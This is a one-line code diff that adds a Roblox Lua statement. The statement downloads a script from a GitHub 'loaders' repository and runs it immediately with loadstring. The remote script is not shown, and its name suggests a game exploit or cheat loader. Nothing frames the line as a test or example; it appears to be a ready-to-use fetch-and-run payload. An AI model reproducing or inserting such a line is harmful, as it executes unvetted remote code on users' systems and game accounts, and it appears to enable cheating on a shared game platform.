@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam5-oo50gel2m51ugt.lua"))()
